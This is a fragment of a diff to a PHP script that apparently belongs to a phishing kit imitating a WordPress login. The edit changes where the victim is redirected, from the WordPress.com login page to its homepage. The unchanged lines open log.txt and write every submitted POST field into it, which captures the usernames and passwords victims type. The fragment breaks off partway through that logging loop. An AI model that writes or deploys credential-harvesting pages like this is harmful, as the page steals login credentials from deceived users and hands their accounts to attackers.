@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://wordpress.com/log-in');
+header ('Location: https://wordpress.com/');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
